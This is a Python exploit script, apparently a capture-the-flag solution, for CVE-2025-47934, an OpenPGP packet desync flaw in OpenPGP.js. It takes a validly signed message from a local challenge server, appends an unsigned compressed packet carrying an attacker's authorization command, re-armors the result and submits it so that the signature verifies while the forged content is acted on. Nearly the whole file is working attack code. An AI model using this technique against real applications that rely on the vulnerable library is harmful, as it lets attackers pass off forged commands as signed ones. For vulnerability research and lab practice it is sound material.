#!/usr/bin/env python3
# Author: supasuge
# Python version: 3.12+
# CVE-2025-47934: OpenPGP Packet Desync Attack Exploit Script
import requests
import base64
import zlib

TARGET_URL = "http://localhost:3000"

MALICIOUS_PAYLOAD = """ACTION: RELEASE
TARGET: FLAG_VAULT
OPERATOR: Attacker
MESSAGE: This content was never signed by Alice."""

def create_literal_data_packet(text):
    """Create an OpenPGP Literal Data packet (tag 11)"""
    data = b't'  # text format
    data += b'\x00'  # filename length (0)
    data += b'\x00\x00\x00\x00'  # timestamp (0)
    data += text.encode('utf-8')  # actual text

    # Tag: 11 (literal data), new format
    tag = 0xCB  # 11001011: new format, tag 11

    # Length encoding (new format, two-octet length)
    length = len(data)
    if length < 192:
        length_bytes = bytes([length])
    elif length < 8384:
        length -= 192
        length_bytes = bytes([192 + (length >> 8), length & 0xFF])
    else:
        length_bytes = b'\xFF' + length.to_bytes(4, 'big')

    return bytes([tag]) + length_bytes + data

def create_compressed_packet(inner_packets):
    """Create an OpenPGP Compressed Data packet (tag 8)"""
    # Algorithm 1 = ZIP (DEFLATE)
    # Use raw DEFLATE compression (no zlib headers)
    compressor = zlib.compressobj(zlib.Z_DEFAULT_COMPRESSION, zlib.DEFLATED, -15)
    compressed = compressor.compress(inner_packets) + compressor.flush()
    compressed_data = b'\x01' + compressed

    # Tag: 8 (compressed data), new format
    tag = 0xC8  # 11001000: new format, tag 8

    # Length encoding
    length = len(compressed_data)
    if length < 192:
        length_bytes = bytes([length])
    elif length < 8384:
        length -= 192
        length_bytes = bytes([192 + (length >> 8), length & 0xFF])
    else:
        length_bytes = b'\xFF' + length.to_bytes(4, 'big')

    return bytes([tag]) + length_bytes + compressed_data

def armor_pgp_message(binary_data):
    """Convert binary PGP packets to ASCII-armored format"""
    b64_data = base64.b64encode(binary_data).decode('ascii')

    # Format as PGP message with line breaks every 64 chars
    lines = [b64_data[i:i+64] for i in range(0, len(b64_data), 64)]

    # Calculate CRC24 checksum
    crc = 0xB704CE
    for byte in binary_data:
        crc ^= byte << 16
        for _ in range(8):
            crc <<= 1
            if crc & 0x1000000:
                crc ^= 0x1864CFB
    crc &= 0xFFFFFF

    checksum = '=' + base64.b64encode(crc.to_bytes(3, 'big')).decode('ascii')

    result = "-----BEGIN PGP MESSAGE-----\n\n"
    result += '\n'.join(lines)
    result += '\n' + checksum + '\n'
    result += "-----END PGP MESSAGE-----"

    return result

def solve():
    print("╔═══════════════════════════════════════════════════════════╗")
    print("║   CVE-2025-47934 Exploit: OpenPGP Packet Desync Attack    ║")
    print("╚═══════════════════════════════════════════════════════════╝\n")

    print("[*] Step 1: Fetching legitimate signed message from Alice...")
    response = requests.get(f"{TARGET_URL}/samples")
    samples = response.json()

    if not samples:
        print("✗ No sample messages available")
        return

    legitimate_message = samples[0]['content']
    print("    ✓ Retrieved sample message\n")

    print("[*] Step 2: Extracting binary packets from armored message...")
    # Extract base64 data between headers
    lines = legitimate_message.split('\n')
    b64_lines = []
    in_body = False
    for line in lines:
        if line.startswith('-----BEGIN'):
            in_body = True
            continue
        if line.startswith('-----END') or line.startswith('='):
            break
        if in_body and line.strip():
            b64_lines.append(line.strip())

    original_binary = base64.b64decode(''.join(b64_lines))
    print("    ✓ Original message decoded\n")

    print("[*] Step 3: Crafting malicious Literal Data packet...")
    malicious_literal = create_literal_data_packet(MALICIOUS_PAYLOAD)
    print("    ✓ Malicious payload created\n")

    print("[*] Step 4: Creating Compressed Data packet...")
    compressed_packet = create_compressed_packet(malicious_literal)
    print("    ✓ Compressed packet created\n")

    print("[*] Step 5: Appending malicious packet to signed message...")
    exploit_binary = original_binary + compressed_packet
    exploit_message = armor_pgp_message(exploit_binary)
    print("    ✓ Exploit message constructed\n")

    print("[*] Packet structure:")
    print("    ┌─────────────────────────────────────────┐")
    print("    │ One-Pass Signature                      │  ← Signed")
    print("    ├─────────────────────────────────────────┤")
    print("    │ Literal Data (benign)                   │  ← Signed")
    print("    ├─────────────────────────────────────────┤")
    print("    │ Signature (valid)                       │")
    print("    ├─────────────────────────────────────────┤")
    print("    │ Compressed Data (MALICIOUS)             │  ← NOT SIGNED")
    print("    │   └─ Literal Data (auth command)        │  ← Executed!")
    print("    └─────────────────────────────────────────┘\n")

    print("[*] Step 6: Submitting exploit to server...")
    response = requests.post(
        f"{TARGET_URL}/verify",
        json={"message": exploit_message}
    )

    result = response.json()

    print("\n╔═══════════════════════════════════════════════════════════╗")
    print("║                     EXPLOIT RESULT                        ║")
    print("╚═══════════════════════════════════════════════════════════╝\n")

    print(f"Signature Valid: {'✓ YES' if result.get('signatureValid') else '✗ NO'}")
    print(f"Signed By: {result.get('signedBy', 'Unknown')}")
    print(f"Key ID: {result.get('keyID', 'Unknown')}")
    print(f"Authorized: {'✓ YES' if result.get('authorized') else '✗ NO'}")

    print("\n--- Extracted Data (Executed) ---")
    print(result.get('extractedData', 'N/A'))
    print("---\n")

    if result.get('flag'):
        print("╔═══════════════════════════════════════════════════════════╗")
        print("║                    🎉 FLAG CAPTURED 🎉                    ║")
        print("╚═══════════════════════════════════════════════════════════╝\n")
        print(f"    {result['flag']}\n")
        print(f"    {result.get('message', '')}\n")
    else:
        print("✗ Exploit failed - no flag returned\n")

    print("═══════════════════════════════════════════════════════════")
    print("EXPLANATION:")
    print("═══════════════════════════════════════════════════════════")
    print("The server verified the signature against the ORIGINAL")
    print("literal data packet (which was legitimately signed by Alice).")
    print("")
    print("However, when extracting the message content for execution,")
    print("the vulnerable OpenPGP.js library preferentially unwrapped")
    print("the COMPRESSED packet we appended, which contains our")
    print("malicious authorization command.")
    print("")
    print("Result: Valid signature ✓ + Malicious content ✓ = Bypass!")
    print("═══════════════════════════════════════════════════════════\n")

if __name__ == "__main__":
    try:
        solve()
    except Exception as e:
        print(f"\n✗ Exploit failed: {e}")
        print("\nMake sure the challenge server is running:")
        print("  npm start\n")
        exit(1)
